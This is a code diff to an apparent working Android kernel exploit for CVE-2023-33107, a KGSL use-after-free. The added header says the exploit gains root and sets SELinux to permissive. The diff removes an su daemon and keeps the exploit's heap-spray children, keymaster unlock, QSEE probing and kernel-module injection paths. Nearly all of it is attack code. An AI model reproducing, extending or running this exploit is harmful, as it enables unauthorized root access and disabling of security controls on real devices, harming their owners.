@@ -1,3 +1,10 @@
+/*
+ * CVE-2023-33107 KGSL UAF root + SELinux permissive.
+ * Exploit and the forged thread.cpu_context switch-in primitive: Risuntsy
+ * (commit cdb4832 "feat: root + SELinux permissive by default
+ * (forged thread.cpu_context)").
+ * Based on Keto's CVE-2023-33107 KGSL UAF work.
+ */
 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
@@ -24,14 +31,15 @@
 #include "keymaster_device_state.h"
 #include "ko_loader.h"
 #include "selinux_handoff.h"
-#include "su_runtime.h"
 #include "target_profile.h"
 
 #ifndef MAP_FIXED_NOREPLACE
 #define MAP_FIXED_NOREPLACE 0x100000
 #endif
 
+#ifndef PAGE_SIZE
 #define PAGE_SIZE 0x1000UL
+#endif
 #define KGSL_IOC_TYPE 0x09
 #define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
 #define KGSL_CONTEXT_PREAMBLE      0x00000010
@@ -104,7 +112,6 @@ struct ctrl {
     volatile int qsee_done;
     volatile int qsee_status;
     volatile int daemon_abort;
-    volatile int daemon_stage;
     volatile int sec_probe_cand;
     volatile int sec_probe_ready;
     volatile int sec_probe_result;
@@ -1350,12 +1357,7 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
         __sync_synchronize();
     }
 
-    if (su_runtime_start_daemon(&ctrls[idx].daemon_stage) < 0) {
-        ctrls[idx].error = errno ? errno : EIO;
-        __sync_synchronize();
-        _exit(127);
-    }
-    _exit(127);
+    _exit(0);
 }
 
 static void spray_children(int kgsl_fd) {
@@ -2533,8 +2535,6 @@ int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     g_start_ms = now_ms();
-    int mode_status = su_runtime_dispatch(argc, argv);
-    if (mode_status >= 0) return mode_status;
 
     g_target = target_profile_get();
     printf("[*] target %s, %s\n", g_target->model, g_target->kernel_release);
@@ -2553,21 +2553,6 @@ int main(int argc, char **argv) {
     if (run_kmunlock && strcmp(km_mode, "read") && strcmp(km_mode, "write")) {
         fprintf(stderr, "[-] KM_UNLOCK_MODE must be read or write\n");
         return 2;
-    }
-    if (!run_kmunlock && !sec_sid_mode && !getenv("INJECT_KO") &&
-        su_runtime_wait_ready(300) == 0) {
-        if (!sec_perm_mode) {
-            printf("[+] root su service already running\n");
-            return 0;
-        }
-        if (sec_read_enforce() == 0) {
-            printf("[+] root su service already running, SELinux permissive\n");
-            return 0;
-        }
-        fprintf(stderr,
-                "[-] root su service already running but SELinux is enforcing;"
-                " reboot and run again\n");
-        return 1;
     }
 
     pid_t qsee_pid = -1;
@@ -2668,10 +2653,6 @@ int main(int argc, char **argv) {
     memset(ctrls, 0, sizeof(struct ctrl) * (size_t)g_child_count);
     if (install_child_cleanup_handlers() < 0) {
         perror("install child cleanup handlers");
-        return 1;
-    }
-    if (!run_kmunlock && !sec_sid_mode && su_runtime_prepare() < 0) {
-        perror("prepare su runtime");
         return 1;
     }
     if (pin_parent_for_spray() < 0) {
@@ -2873,7 +2854,6 @@ int main(int argc, char **argv) {
 
     printf("[*] reaping spray children after root verification\n");
     kill_children_except(root_child.idx);
-    if (!run_kmunlock && !sec_sid_mode) su_runtime_close_prepared_server_socket();
     if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
         /* stage the payload for the child: it lives in the shell domain and
          * cannot read /data/local/tmp once it has adopted another SID. */
@@ -3212,38 +3192,16 @@ int main(int argc, char **argv) {
             munmap(g_km_current_buffer, KM_BUFFER_SIZE);
         if (g_km_expected_buffer)
             munmap(g_km_expected_buffer, KM_BUFFER_SIZE);
-        if (su_runtime_wait_ready(0) == 0)
-            printf("[+] existing root su service remains ready\n");
         return qsee_status == 0 ? 0 : 1;
     }
 
-    int ready = 0;
-    int last_stage = 0;
-    for (int elapsed = 0; elapsed <= 90000; elapsed += 50) {
-        int stage = ctrls[root_child.idx].daemon_stage;
-        if (stage != last_stage) {
-            printf("[*] daemon startup stage=%d\n", stage);
-            last_stage = stage;
-        }
-        if (su_runtime_wait_ready(0) == 0) {
-            ready = 1;
-            break;
-        }
-        usleep(50000);
+    int status = 0;
+    while (waitpid(root_child.pid, &status, 0) < 0 && errno == EINTR) {}
+    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        printf("[+] root child finished\n");
+        mark("root child finished");
+        return 0;
     }
-    if (!ready) {
-        errno = ETIMEDOUT;
-        perror("waiting for root su service");
-        fprintf(stderr, "[-] daemon setup error=%d stage=%d\n",
-                ctrls[root_child.idx].error,
-                ctrls[root_child.idx].daemon_stage);
-        ctrls[root_child.idx].daemon_abort = 1;
-        __sync_synchronize();
-        kill(root_child.pid, SIGTERM);
-        return 1;
-    }
-
-    printf("[+] root su service ready\n");
-    mark("su service ready");
-    return 0;
+    fprintf(stderr, "[-] root child exited status=%d\n", status);
+    return 1;
 }
